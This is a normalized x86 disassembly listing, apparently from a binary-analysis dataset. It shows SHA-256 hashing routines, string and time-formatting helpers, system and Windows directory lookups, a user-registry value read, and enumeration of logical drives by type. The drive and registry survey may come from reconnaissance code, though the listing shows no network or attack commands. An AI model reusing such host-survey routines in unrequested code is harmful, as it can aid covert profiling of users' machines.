mov ebx edx
xor ebx [ esp + 0x2c ]
and ebx edi
xor ebx edx
add eax [ esp + 0x128 ]
add ebx eax
lea ecx [ ebx + ecx - 0x5baf9315 ]
add [ esp + 0x30 ] ecx
mov eax [ esp + 0x18 ]
mov [ esp + 0x10 ] ecx
mov ebx [ esp + 0x28 ]
mov ebp eax
ror ebp 0xd
mov ecx eax
rol ecx 0xa
xor ebp ecx
mov ecx eax
ror ecx 0x2
xor ebp ecx
add ebp [ esp + 0x10 ]
mov ecx ebx
or ecx eax
and ecx esi
and ebx eax
or ecx ebx
add ecx ebp
mov [ esp + 0x14 ] ecx
mov ecx [ esp + 0x124 ]
mov ebp ecx
mov ebx ecx
shr ecx 0xa
rol ebp 0xf
rol ebx 0xd
xor ebp ebx
xor ebp ecx
add ebp [ esp + 0x110 ]
mov ebx [ esp + 0xf0 ]
mov ecx ebx
rol ecx 0xe
ror ebx 0x7
xor ecx ebx
mov ebx [ esp + 0xf0 ]
shr ebx 0x3
xor ecx ebx
add ecx ebp
add ecx [ esp + 0xec ]
mov [ esp + 0x12c ] ecx
mov ecx [ esp + 0x30 ]
mov ebx ecx
mov ebp ecx
ror ebx 0xb
rol ebp 0x7
xor ebx ebp
ror ecx 0x6
xor ebx ecx
add ebx [ esp + 0x12c ]
mov ecx edi
xor ecx [ esp + 0x2c ]
and ecx [ esp + 0x30 ]
xor ecx [ esp + 0x2c ]
add ecx ebx
mov ebx [ esp + 0x14 ]
lea edx [ ecx + edx - 0x41065c09 ]
add esi edx
mov ebp ebx
ror ebp 0xd
mov ecx ebx
rol ecx 0xa
xor ebp ecx
mov ecx ebx
ror ecx 0x2
xor ebp ecx
mov ecx eax
or ecx ebx
and ecx [ esp + 0x28 ]
mov ebx eax
and ebx [ esp + 0x14 ]
add ebp edx
or ecx ebx
add ecx ebp
mov [ esp + 0x20 ] ecx
mov edx esi
mov ecx esi
ror edx 0xb
rol ecx 0x7
xor edx ecx
mov ecx esi
ror ecx 0x6
xor edx ecx
mov ecx [ esp + 0x128 ]
mov ebx ecx
rol ebx 0xf
mov ebp ecx
shr ecx 0xa
rol ebp 0xd
xor ebx ebp
xor ebx ecx
mov ecx [ esp + 0xf4 ]
add edx ebx
mov ebx ecx
mov ebp ecx
rol ebx 0xe
ror ebp 0x7
xor ebx ebp
shr ecx 0x3
xor ebx ecx
add ebx [ esp + 0x114 ]
mov ecx edi
xor ecx [ esp + 0x30 ]
add ebx edx
mov edx [ esp + 0x2c ]
and ecx esi
xor ecx edi
add ecx ebx
add ecx [ esp + 0xf0 ]
lea ecx [ ecx + edx - 0x398e870e ]
mov edx [ esp + 0x20 ]
mov [ esp + 0x10 ] ecx
mov ebx edx
ror ebx 0xd
mov ecx edx
rol ecx 0xa
xor ebx ecx
mov ecx edx
ror ecx 0x2
xor ebx ecx
mov ecx [ esp + 0x14 ]
mov ebp ecx
or ebp edx
and ebp eax
and ecx edx
or ebp ecx
mov ecx [ esp + 0x138 ]
add ebx [ ecx + 0x8 ]
add ebp ebx
mov ebx [ esp + 0x10 ]
add ebp ebx
mov [ ecx + 0x8 ] ebp
mov ebp [ ecx + 0xc ]
add ebp edx
mov edx [ ecx + 0x10 ]
mov [ ecx + 0xc ] ebp
mov ebp [ esp + 0x14 ]
add edx ebp
mov [ ecx + 0x10 ] edx
mov edx [ ecx + 0x14 ]
add edx eax
mov eax [ ecx + 0x18 ]
add eax ebx
add eax [ esp + 0x28 ]
mov [ ecx + 0x14 ] edx
mov edx [ esp + 0x30 ]
mov [ ecx + 0x18 ] eax
mov eax [ ecx + 0x1c ]
add eax esi
mov [ ecx + 0x1c ] eax
mov eax [ ecx + 0x20 ]
add eax edx
mov [ ecx + 0x20 ] eax
mov eax [ ecx + 0x24 ]
add eax edi
pop edi
pop esi
pop ebp
mov [ ecx + 0x24 ] eax
pop ebx
add esp 0x124
retn
sub_4056e0
push edi
mov edi [ esp + 0x10 ]
test edi edi
je r-xdata
pop edi
retn
push ebx
push ebp
push esi
mov esi [ esp + 0x14 ]
mov eax [ esi ]
mov ebp eax
and ebp 0x3f
mov ebx 0x40
add eax edi
sub ebx ebp
cmp eax edi
mov [ esi ] eax
jae r-xdata
test ebp ebp
je r-xdata
add [ esi + 0x4 ] 0x1
cmp edi 0x40
jb r-xdata
cmp edi ebx
jb r-xdata
test edi edi
je r-xdata
mov ebx edi
shr ebx 0x6
mov eax [ esp + 0x18 ]
push ebx
push eax
lea ecx [ esi + ebp + 0x28 ]
push ecx
call sub_4022a0
lea edx [ esi + 0x28 ]
push edx
push esi
call sub_402d30
add [ esp + 0x2c ] ebx
add esp 0x14
sub edi ebx
xor ebp ebp
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x18 ]
push edi
push ecx
lea edx [ esi + ebp + 0x28 ]
push edx
call sub_4022a0
add esp 0xc
mov eax [ esp + 0x18 ]
push eax
push esi
call sub_402d30
add [ esp + 0x20 ] 0x40
add esp 0x8
sub edi 0x40
sub ebx 0x1
jne r-xdata
sub_405780
sub esp 0xc
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
push ebx
push esi
push edi
mov esi [ esp + 0x1c ]
mov ecx [ esi ]
mov eax [ esi + 0x4 ]
add eax eax
add eax eax
add eax eax
mov edx ecx
shr edx 0x1d
or eax edx
mov ebx eax
shr ebx 0x18
mov [ esp + 0xc ] bl
mov ebx eax
shr ebx 0x10
mov [ esp + 0xf ] al
lea edx [ ecx * 8 ]
mov [ esp + 0xd ] bl
mov ebx eax
mov eax edx
shr eax 0x18
mov [ esp + 0x10 ] al
mov eax edx
shr eax 0x10
mov [ esp + 0x11 ] al
mov eax edx
shr eax 0x8
shr ebx 0x8
and ecx 0x3f
cmp ecx 0x38
mov edi [ esp + 0x20 ]
mov [ esp + 0x12 ] al
mov [ esp + 0xe ] bl
mov [ esp + 0x13 ] dl
mov eax 0x38
jb r-xdata
sub eax ecx
push eax
push rw-data
push esi
call sub_4056e0
push 0x8
lea ecx [ esp + 0x1c ]
push ecx
push esi
call sub_4056e0
movzx edx [ esi + 0xb ]
mov [ edi ] dl
movzx eax [ esi + 0xa ]
mov [ edi + 0x1 ] al
mov ecx [ esi + 0x8 ]
shr ecx 0x8
mov [ edi + 0x2 ] cl
movzx edx [ esi + 0x8 ]
mov [ edi + 0x3 ] dl
movzx eax [ esi + 0xf ]
mov [ edi + 0x4 ] al
movzx ecx [ esi + 0xe ]
mov [ edi + 0x5 ] cl
mov edx [ esi + 0xc ]
shr edx 0x8
mov [ edi + 0x6 ] dl
movzx eax [ esi + 0xc ]
mov [ edi + 0x7 ] al
movzx ecx [ esi + 0x13 ]
mov [ edi + 0x8 ] cl
movzx edx [ esi + 0x12 ]
mov [ edi + 0x9 ] dl
mov eax [ esi + 0x10 ]
shr eax 0x8
mov [ edi + 0xa ] al
movzx ecx [ esi + 0x10 ]
mov [ edi + 0xb ] cl
movzx edx [ esi + 0x17 ]
mov [ edi + 0xc ] dl
movzx eax [ esi + 0x16 ]
mov [ edi + 0xd ] al
mov ecx [ esi + 0x14 ]
shr ecx 0x8
mov [ edi + 0xe ] cl
movzx edx [ esi + 0x14 ]
mov [ edi + 0xf ] dl
movzx eax [ esi + 0x1b ]
mov [ edi + 0x10 ] al
movzx ecx [ esi + 0x1a ]
mov [ edi + 0x11 ] cl
mov edx [ esi + 0x18 ]
shr edx 0x8
mov [ edi + 0x12 ] dl
movzx eax [ esi + 0x18 ]
mov [ edi + 0x13 ] al
movzx ecx [ esi + 0x1f ]
mov [ edi + 0x14 ] cl
movzx edx [ esi + 0x1e ]
mov [ edi + 0x15 ] dl
mov eax [ esi + 0x1c ]
shr eax 0x8
mov [ edi + 0x16 ] al
movzx ecx [ esi + 0x1c ]
mov [ edi + 0x17 ] cl
movzx edx [ esi + 0x23 ]
mov [ edi + 0x18 ] dl
movzx eax [ esi + 0x22 ]
mov [ edi + 0x19 ] al
mov ecx [ esi + 0x20 ]
shr ecx 0x8
mov [ edi + 0x1a ] cl
movzx edx [ esi + 0x20 ]
mov [ edi + 0x1b ] dl
movzx eax [ esi + 0x27 ]
mov [ edi + 0x1c ] al
movzx ecx [ esi + 0x26 ]
mov [ edi + 0x1d ] cl
mov edx [ esi + 0x24 ]
add esp 0x18
shr edx 0x8
mov [ edi + 0x1e ] dl
movzx eax [ esi + 0x24 ]
mov ecx [ esp + 0x14 ]
mov [ edi + 0x1f ] al
pop edi
pop esi
pop ebx
xor ecx esp
call sub_40acd2
add esp 0xc
retn
mov eax 0x78
sub_405950
mov ecx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
mov al 0x1
jmp r-xdata
mov dl [ esi ]
test dl dl
jne r-xdata
test al al
je r-xdata
cmp [ ecx ] dl
je r-xdata
pop esi
retn
cmp dl [ ecx ]
sete al
add esi 0x1
add ecx 0x1
jmp r-xdata
sub_405980
mov eax [ esp + 0x4 ]
cmp [ eax ] 0x0
je r-xdata
mov edx [ esp + 0x8 ]
test edx edx
je r-xdata
lea esp [ esp ]
mov [ eax ] 0x0
retn
mov cl [ edx ]
test cl cl
je r-xdata
add eax 0x1
cmp [ eax ] 0x0
jne r-xdata
add edx 0x1
mov [ eax ] cl
mov cl [ edx ]
add eax 0x1
test cl cl
jne r-xdata
sub_4059c0
push ebx
mov bl [ esp + 0x10 ]
push ebp
push esi
mov esi [ esp + 0x10 ]
xor ebp ebp
test bl bl
mov [ esi ] 0x0
jne r-xdata
test bl bl
push edi
mov edi [ esp + 0x18 ]
jle r-xdata
mov ecx [ esp + 0x14 ]
mov al [ ecx ]
test al al
je r-xdata
jge r-xdata
mov al [ edi ]
test al al
je r-xdata
mov [ esi ] 0x0
mov eax esi
pop esi
pop ebp
pop ebx
retn
add ecx 0x1
mov [ esi ] al
mov al [ ecx ]
add esi 0x1
test al al
jne r-xdata
pop edi
cmp [ edi ] 0x0
je r-xdata
test bl bl
jle r-xdata
test bl bl
je r-xdata
mov [ esi ] al
mov eax esi
pop esi
pop ebp
pop ebx
retn
movsx eax bl
add ebp 0x1
sub esi eax
add bl 0xff
test ebp ebp
je r-xdata
add edi 0x1
add ebp 0x1
cmp [ edi ] 0x0
jne r-xdata
mov [ esi ] 0x0
test bl bl
movzx eax bl
push eax
push 0x20
push esi
mov [ esp + 0x28 ] eax
call sub_40acf0
mov eax [ esp + 0x28 ]
add esp 0xc
sub bl al
add esi eax
add edi 0x1
mov [ esi ] al
mov al [ edi ]
add esi 0x1
add bl 0xff
test al al
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
cmp [ esi ] 0x0
je r-xdata
neg bl
movzx eax bl
mov cl [ edi ]
mov [ esi ] cl
sub edi 0x1
sub esi 0x1
add bl 0x1
sub ebp 0x1
jne r-xdata
add esi 0x1
cmp [ esi ] 0x0
jne r-xdata
mov [ esi ] 0x20
sub esi 0x1
sub eax 0x1
jne r-xdata
sub_405ad0
sub esp 0x14
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x10 ] eax
mov edx [ esp + 0x1c ]
push ebx
xor cl cl
test edx edx
push esi
mov esi [ esp + 0x20 ]
jne r-xdata
mov eax 0xcccccccd
mul edx
shr edx 0x3
mov al dl
mov bl 0xa
imul bl
mov bl [ esp + 0x24 ]
sub bl al
movsx eax cl
or bl 0x30
add cl 0x1
test edx edx
mov [ esp + eax + 0x8 ] bl
mov [ esp + 0x24 ] edx
jne r-xdata
mov [ esp + 0x8 ] 0x30
mov cl 0x1
jmp r-xdata
mov al [ esp + 0x28 ]
test al al
movsx edx cl
lea edx [ esp + edx + 0x8 ]
mov [ edx ] 0x0
jne r-xdata
test al al
push edi
jle r-xdata
test cl cl
je r-xdata
jge r-xdata
test cl cl
je r-xdata
mov ecx [ esp + 0x18 ]
mov [ esi ] 0x0
mov eax esi
pop esi
pop ebx
xor ecx esp
call sub_40acd2
add esp 0x14
retn
lea eax [ edx - 0x1 ]
pop edi
xor bl bl
test cl cl
je r-xdata
test al al
je r-xdata
test al al
je r-xdata
mov dl [ eax ]
mov [ esi ] dl
add cl 0xff
sub eax 0x1
add esi 0x1
test cl cl
jne r-xdata
jmp r-xdata
test al al
je r-xdata
nop
movzx edi al
push edi
push 0x20
push esi
call sub_40acf0
add esp 0xc
add esi edi
jmp r-xdata
movsx edx cl
mov dl [ esp + edx + 0xb ]
mov [ esi ] dl
add cl 0xff
add esi 0x1
add al 0xff
test cl cl
jne r-xdata
test bl bl
je r-xdata
neg al
movzx edi al
push edi
push 0x20
push esi
call sub_40acf0
add esp 0xc
add esi edi
add cl 0xff
add al 0x1
add bl 0x1
test cl cl
jne r-xdata
movsx eax bl
lea eax [ esp + eax + 0xb ]
test al al
je r-xdata
mov cl [ eax ]
mov [ esi ] cl
add bl 0xff
sub eax 0x1
add esi 0x1
test bl bl
jne r-xdata
sub_405c00
sub esp 0x90
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8c ] eax
mov eax [ esp + 0x98 ]
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
push ebx
push esi
mov esi [ esp + 0x9c ]
mov [ esp + 0xc ] ecx
mov [ esp + 0x10 ] edx
xor bl bl
lea eax [ esp + 0xc ]
push 0xa
push eax
mov ecx eax
push ecx
call sub_402ba0
movsx edx bl
or al 0x30
add esp 0xc
mov [ esp + edx + 0x14 ] al
add bl 0x1
jmp r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov al [ esp + 0xa4 ]
test al al
movsx ecx bl
lea ecx [ esp + ecx + 0x14 ]
mov [ ecx ] 0x0
jne r-xdata
test al al
push edi
jle r-xdata
test bl bl
je r-xdata
jge r-xdata
test bl bl
je r-xdata
mov ecx [ esp + 0x94 ]
mov [ esi ] 0x0
mov eax esi
pop esi
pop ebx
xor ecx esp
call sub_40acd2
add esp 0x90
retn
lea eax [ ecx - 0x1 ]
pop edi
xor cl cl
test bl bl
mov [ esp + 0xf ] cl
je r-xdata
test al al
je r-xdata
test al al
je r-xdata
mov cl [ eax ]
mov [ esi ] cl
add bl 0xff
sub eax 0x1
add esi 0x1
test bl bl
jne r-xdata
jmp r-xdata
test al al
je r-xdata
test al al
je r-xdata
movzx edi al
push edi
push 0x20
push esi
call sub_40acf0
add esp 0xc
add esi edi
jmp r-xdata
movsx edx bl
mov cl [ esp + edx + 0x17 ]
mov [ esi ] cl
add bl 0xff
add esi 0x1
add al 0xff
test bl bl
jne r-xdata
test cl cl
je r-xdata
neg al
movzx edi al
push edi
push 0x20
push esi
call sub_40acf0
mov cl [ esp + 0x1b ]
add esp 0xc
add esi edi
add bl 0xff
add al 0x1
add cl 0x1
test bl bl
jne r-xdata
movsx eax cl
lea eax [ esp + eax + 0x17 ]
lea ebx [ ebx ]
mov [ esp + 0xf ] cl
mov dl [ eax ]
mov [ esi ] dl
add cl 0xff
sub eax 0x1
add esi 0x1
test cl cl
jne r-xdata
sub_405d50
mov dl [ esp + 0xc ]
mov eax [ esp + 0x4 ]
movsx ecx dl
add eax ecx
test dl dl
mov [ eax ] 0x0
je r-xdata
cmp [ eax ] 0x0
je r-xdata
push ebx
mov ebx [ esp + 0xc ]
lea esp [ esp ]
retn
add eax 0x1
cmp [ eax ] 0x0
jne r-xdata
add cl 0x37
add cl 0x30
jmp r-xdata
mov cl bl
and cl 0xf
sub eax 0x1
add dl 0xff
cmp cl 0xa
jae r-xdata
pop ebx
shr ebx 0x4
test dl dl
mov [ eax ] cl
jne r-xdata
sub_405dd0
mov eax [ esp + 0x4 ]
cmp [ eax ] 0x0
je r-xdata
push esi
mov esi [ esp + 0xc ]
movzx ecx [ esi + 0x8 ]
push edi
push 0xfffffffe
push ecx
push eax
mov edi eax
call sub_405ad0
push 0x3a
push eax
call sub_405ab0
movzx edx [ esi + 0xa ]
push 0xfffffffe
push edx
push eax
call sub_405ad0
push 0x3a
push eax
call sub_405ab0
movzx ecx [ esi + 0xc ]
push 0xfffffffe
push ecx
push eax
call sub_405ad0
push edi
call sub_405da0
add esp 0x38
pop edi
pop esi
retn
lea esp [ esp ]
add eax 0x1
cmp [ eax ] 0x0
jne r-xdata
sub_405e40
mov ecx [ esp + 0x8 ]
sub esp 0x10
push esi
lea eax [ esp + 0x4 ]
push eax
push ecx
call [ FileTimeToSystemTime@IAT ]
mov esi [ esp + 0x18 ]
lea edx [ esp + 0x4 ]
push edx
push esi
call sub_405dd0
add esp 0x8
mov eax esi
pop esi
add esp 0x10
retn
sub_405e70
sub esp 0x2c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x28 ] eax
mov eax [ esp + 0x30 ]
cmp [ eax ] 0x0
push ebx
mov ebx [ esp + 0x38 ]
push esi
push edi
mov ecx 0x9
mov esi rw-data
lea edi [ esp + 0xc ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov edi eax
je r-xdata
movzx ecx [ ebx + 0x6 ]
push 0xfffffffe
push ecx
push eax
call sub_405ad0
add esp 0xc
cmp [ esp + 0x44 ] 0x0
mov esi eax
je r-xdata
add eax 0x1
cmp [ eax ] 0x0
jne r-xdata
movzx ecx [ ebx + 0x2 ]
lea edx [ esp + ecx + 0xc ]
movzx eax [ edx + ecx * 2 - 0x3 ]
lea edx [ edx + ecx * 2 - 0x3 ]
push eax
push esi
call sub_405ab0
movzx ecx [ edx + 0x1 ]
mov esi eax
push ecx
push esi
call sub_405ab0
movzx edx [ edx + 0x2 ]
push edx
push eax
call sub_405ab0
movzx ecx [ ebx ]
push 0xfffffffc
push ecx
push eax
call sub_405ad0
mov ecx [ esp + 0x58 ]
add esp 0x24
pop edi
pop esi
pop ebx
xor ecx esp
call sub_40acd2
add esp 0x2c
retn
cmp [ edi ] 0x20
jne r-xdata
mov [ edi ] 0x30
sub_405f20
mov ecx [ esp + 0x8 ]
sub esp 0x10
push esi
lea eax [ esp + 0x4 ]
push eax
push ecx
call [ FileTimeToSystemTime@IAT ]
mov edx [ esp + 0x20 ]
mov esi [ esp + 0x18 ]
push edx
lea eax [ esp + 0x8 ]
push eax
push esi
call sub_405e70
add esp 0xc
mov eax esi
pop esi
add esp 0x10
retn
sub_405f60
mov edx [ esp + 0x4 ]
movzx ecx [ edx ]
xor eax eax
test cl cl
je r-xdata
retn
lea ecx [ ecx ]
cmp cl 0x39
jg r-xdata
and ecx 0xf
lea eax [ eax + eax * 4 ]
add edx 0x1
lea eax [ ecx + eax * 2 ]
mov cl [ edx ]
test cl cl
jne r-xdata
cmp cl 0x30
jl r-xdata
sub_405f90
push ecx
mov ax [ rw-data ]
mov cl [ rw-data ]
push ebx
push esi
mov esi [ esp + 0x14 ]
xor ebx ebx
cmp [ esi ] bl
mov [ esp + 0x8 ] ax
mov eax [ esp + 0x10 ]
mov [ esp + 0xa ] cl
je r-xdata
pop esi
pop ebx
pop ecx
retn
push edi
mov edi [ esp + 0x1c ]
add edi 0xfffffffc
movzx ecx [ esi + 0x1 ]
add esi 0x1
test cl cl
je r-xdata
mov [ eax ] cl
add eax 0x1
jmp r-xdata
pop edi
cmp cl 0x30
jl r-xdata
add esi 0x1
mov [ eax ] 0x0
cmp [ esi ] 0x0
jne r-xdata
mov dl [ esi ]
test dl dl
je r-xdata
cmp cl 0x39
jg r-xdata
mov cl [ esi ]
cmp cl 0x25
je r-xdata
mov ecx [ edi + 0x4 ]
movsx edx dl
add edi 0x4
add edx 0xffffff9c
cmp edx 0x14
ja r-xdata
and ecx 0xf
mov ebx ecx
add esi 0x1
movzx edx [ edx + lookup_table_40608c ]
jmp [ edx * 4 + jump_table_406078 ]
test ecx ecx
push 0x0
je r-xdata
movzx edx bl
neg dl
push edx
push ecx
push eax
call sub_405ad0
jmp r-xdata
test ecx ecx
je r-xdata
push ebx
push ecx
push eax
call sub_405d50
lea ecx [ esp + 0x10 ]
push ecx
push eax
call sub_4059c0
jmp r-xdata
push ecx
push eax
call sub_4059c0
jmp r-xdata
add esp 0xc
push 0x0
movzx edx bl
neg dl
push edx
push ecx
push eax
call sub_405c00
jmp r-xdata
sub_4060d0
push ecx
mov ecx [ esp + 0x8 ]
xor al al
cmp [ ecx ] al
push esi
mov [ esp + 0x5 ] 0x1
mov esi ecx
mov [ esp + 0x7 ] al
je r-xdata
pop esi
pop ecx
retn
mov edx [ esp + 0xc ]
push ebx
mov bl [ esp + 0x10 ]
push ebp
mov ebp [ esp + 0x1c ]
push edi
mov edi [ esp + 0x18 ]
mov edi edi
cmp [ esp + 0x12 ] al
je r-xdata
mov edi [ esp + 0x1c ]
mov [ esp + 0x12 ] 0x1
mov [ esp + 0x18 ] 0x1
mov [ esp + 0x11 ] al
xor bl bl
jmp r-xdata
test bl bl
je r-xdata
mov cl [ esi ]
cmp cl 0xa
je r-xdata
mov ebp [ esp + 0x20 ]
add esi 0x1
xor al al
mov cl [ esi ]
cmp cl 0xd
je r-xdata
mov [ esp + 0x11 ] 0x1
cmp cl 0xd
jne r-xdata
cmp [ esp + 0x11 ] al
je r-xdata
mov al [ esp + 0x13 ]
pop edi
pop ebp
pop ebx
mov [ esp + 0x11 ] 0x1
cmp cl 0xa
je r-xdata
cmp [ esp + 0x18 ] 0x0
je r-xdata
xor al al
cmp [ edi ] al
je r-xdata
cmp cl [ esp + 0x28 ]
jne r-xdata
cmp [ esp + 0x18 ] 0x0
je r-xdata
cmp [ edi ] cl
je r-xdata
mov edx ebp
mov bl 0x1
mov [ esp + 0x12 ] al
add esi 0x1
jmp r-xdata
mov [ esp + 0x18 ] al
mov eax edx
sub eax ebp
mov ebp [ esp + 0x24 ]
add ebp 0xffffffff
cmp eax ebp
mov [ esp + 0x13 ] 0x1
jge r-xdata
add edi 0x1
mov [ esp + 0x18 ] 0x0
jmp r-xdata
cmp [ esi ] al
jne r-xdata
mov [ edx ] cl
add edx 0x1
mov [ edx ] 0x0
jmp r-xdata
sub_4061e0
mov cl [ esp + 0x4 ]
and cl 0xf
xor al al
cmp cl 0x9
ja r-xdata
mov dl cl
sub dl 0xa
cmp dl 0x5
ja r-xdata
mov al cl
add al 0x30
retn
add cl 0x37
mov al cl
sub_406210
push ebp
mov ebp [ esp + 0x10 ]
push esi
xor esi esi
test ebp ebp
jle r-xdata
mov eax [ esp + 0x10 ]
mov [ eax + esi * 2 ] 0x0
pop esi
pop ebp
retn
push ebx
mov ebx [ esp + 0x10 ]
push edi
mov edi [ esp + 0x18 ]
movzx eax [ esi + ebx ]
shr al 0x4
push eax
call sub_4061e0
mov [ edi + esi * 2 ] al
movzx ecx [ esi + ebx ]
push ecx
call sub_4061e0
mov [ edi + esi * 2 + 0x1 ] al
add esi 0x1
add esp 0x8
cmp esi ebp
jl r-xdata
mov [ edi + esi * 2 ] 0x0
mov eax edi
pop edi
pop ebx
pop esi
pop ebp
retn
sub_406270
sub esp 0x40c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x408 ] eax
push esi
mov esi [ esp + 0x414 ]
push 0x100
lea eax [ esp + 0x310 ]
push eax
call [ GetSystemDirectoryA@IAT ]
push 0x100
lea ecx [ esp + 0x210 ]
push ecx
call [ GetWindowsDirectoryA@IAT ]
cmp [ esi ] 0x5c
mov dl [ esp + 0x20c ]
mov al [ esp + 0x20d ]
mov [ esp + 0x4 ] dl
mov [ esp + 0x5 ] al
mov [ esp + 0x6 ] 0x0
je r-xdata
cmp [ esi + 0x1 ] 0x3f
lea eax [ esi + 0x1 ]
jne r-xdata
push 0x0
lea ecx [ esp + 0x310 ]
push ecx
lea edx [ esp + 0x14 ]
push edx
call sub_4059c0
lea eax [ esp + 0x18 ]
push rw-data
push eax
call sub_405980
lea ecx [ esp + 0x20 ]
push esi
push ecx
call sub_405980
lea edx [ esp + 0x28 ]
push edx
push esi
call sub_405980
add esp 0x24
jmp r-xdata
push 0x0
push eax
lea edx [ esp + 0x14 ]
push edx
call sub_4059c0
lea eax [ esp + 0x18 ]
push rw-data
push eax
mov [ esp + 0x2a ] 0x0
call sub_405950
add esp 0x14
test al al
push 0x0
je r-xdata
cmp [ esi + 0x2 ] 0x3f
jne r-xdata
mov ecx [ esp + 0x40c ]
mov eax esi
pop esi
xor ecx esp
call sub_40acd2
add esp 0x40c
retn 0x4
lea eax [ esp + 0x8 ]
push eax
lea ecx [ esp + 0x14 ]
push ecx
call sub_4059c0
lea edx [ esp + 0x18 ]
push esi
push edx
call sub_405980
push 0x0
lea eax [ esp + 0x24 ]
push eax
lea ecx [ esp + 0x210 ]
push ecx
lea edx [ esp + 0x14 ]
push edx
call sub_4059c0
lea eax [ esi + 0xb ]
push eax
lea ecx [ esp + 0x1c ]
push ecx
call sub_405980
push 0x0
lea edx [ esp + 0x24 ]
push edx
jmp r-xdata
cmp [ esi + 0x3 ] 0x5c
jne r-xdata
push esi
call sub_4059c0
add esp 0x20
push 0x0
lea eax [ esp + 0x10 ]
push esi
push eax
call sub_4059c0
push 0x0
lea ecx [ esp + 0x20 ]
push ecx
push esi
call sub_4059c0
add esp 0x18
jmp r-xdata
sub_4063e0
sub esp 0x8
push esi
lea eax [ esp + 0x4 ]
push eax
push 0xf003f
push 0x0
push rw-data
mov esi ecx
call sub_401580
add esp 0x4
push eax
push 0x80000001
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
xor eax eax
pop esi
add esp 0x8
retn 0x4
mov edx [ esp + 0x10 ]
lea ecx [ esp + 0x8 ]
push ecx
add esi 0x3b08
push esi
push eax
push eax
mov eax [ esp + 0x14 ]
push edx
push eax
mov [ esp + 0x20 ] 0x1f4
call [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x4 ]
push ecx
call [ RegCloseKey@IAT ]
mov eax esi
pop esi
add esp 0x8
retn 0x4
sub_406460
sub esp 0x40c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x408 ] eax
push esi
mov esi [ esp + 0x414 ]
push 0x100
lea eax [ esp + 0x310 ]
push eax
call [ GetSystemDirectoryA@IAT ]
push 0x100
lea ecx [ esp + 0x210 ]
push ecx
call [ GetWindowsDirectoryA@IAT ]
cmp [ esi ] 0x5c
mov dl [ esp + 0x20c ]
mov al [ esp + 0x20d ]
mov [ esp + 0x4 ] dl
mov [ esp + 0x5 ] al
mov [ esp + 0x6 ] 0x0
jne r-xdata
mov ecx [ esp + 0x40c ]
mov eax esi
pop esi
xor ecx esp
call sub_40acd2
add esp 0x40c
retn 0x4
cmp [ esi + 0x1 ] 0x3f
lea eax [ esi + 0x1 ]
jne r-xdata
push 0x0
push eax
lea eax [ esp + 0x14 ]
push eax
call sub_4059c0
lea ecx [ esp + 0x18 ]
push rw-data
push ecx
mov [ esp + 0x2a ] 0x0
call sub_405950
add esp 0x14
test al al
push 0x0
je r-xdata
cmp [ esi + 0x2 ] 0x3f
jne r-xdata
lea ecx [ esp + 0x8 ]
push ecx
lea edx [ esp + 0x14 ]
push edx
call sub_4059c0
lea eax [ esp + 0x18 ]
push esi
push eax
call sub_405980
push 0x0
lea ecx [ esp + 0x24 ]
push ecx
lea edx [ esp + 0x210 ]
push edx
lea eax [ esp + 0x14 ]
push eax
call sub_4059c0
lea ecx [ esi + 0xb ]
push ecx
lea edx [ esp + 0x1c ]
push edx
call sub_405980
push 0x0
lea eax [ esp + 0x24 ]
push eax
jmp r-xdata
cmp [ esi + 0x3 ] 0x5c
jne r-xdata
push esi
call sub_4059c0
add esp 0x20
push 0x0
lea ecx [ esp + 0x10 ]
push esi
push ecx
call sub_4059c0
push 0x0
lea edx [ esp + 0x20 ]
push edx
push esi
call sub_4059c0
add esp 0x18
jmp r-xdata
sub_4065a0
mov eax 0x7d04
call sub_40ad70
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x7d00 ] eax
push esi
mov esi [ esp + 0x7d0c ]
push edi
lea eax [ esp + 0x8 ]
push 0x7d00
push eax
call sub_4022d0
mov edx [ esp + 0x7d1c ]
lea ecx [ esp + 0x7d20 ]
push ecx
push edx
lea eax [ esp + 0x18 ]
push eax
call sub_405f90
mov edi [ esi ]
lea ecx [ esp + 0x1c ]
push ecx
call sub_405930
add esp 0x18
push eax
mov eax [ edi + 0x4 ]
lea edx [ esp + 0xc ]
push edx
mov ecx esi
call eax
xor ecx ecx
test eax eax
setge cl
pop edi
pop esi
mov eax ecx
mov ecx [ esp + 0x7d00 ]
xor ecx esp
call sub_40acd2
add esp 0x7d04
retn
sub_406630
sub esp 0x404
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x400 ] eax
push esi
push edi
push rw-data
mov esi ecx
call sub_401580
push eax
push esi
call sub_4065a0
add esp 0xc
lea eax [ esp + 0x8 ]
push eax
push 0x400
call [ GetLogicalDriveStringsA@IAT ]
lea edi [ esp + 0x8 ]
mov ecx edi
push ecx
call sub_405930
add esp 0x4
test eax eax
je r-xdata
push rw-data
call sub_401580
push eax
push esi
call sub_4065a0
mov ecx [ esp + 0x414 ]
add esp 0xc
pop edi
pop esi
xor ecx esp
mov eax 0x1
call sub_40acd2
add esp 0x404
retn
push ebx
mov ebx [ GetDriveTypeA@IAT ]
lea ebx [ ebx ]
push rw-data
call sub_401580
push eax
push esi
call sub_4065a0
push edi
call sub_405930
lea edi [ edi + eax + 0x1 ]
push edi
call sub_405930
add esp 0x14
test eax eax
jne r-xdata
jmp [ eax * 4 + jump_table_406754 ]
push edi
push rw-data
call sub_401580
add esp 0x4
push eax
push esi
call sub_4065a0
add esp 0xc
push edi
call ebx
cmp eax 0x6
ja r-xdata
pop ebx
push rw-data
jmp r-xdata
push rw-data
jmp r-xdata
push rw-data
jmp r-xdata
push rw-data
jmp r-xdata
push rw-data
jmp r-xdata
push rw-data
jmp r-xdata
push rw-data
call sub_401580
push eax
push esi
call sub_4065a0
add esp 0xc
sub_406770
push ebx
push esi
mov esi [ esp + 0xc ]
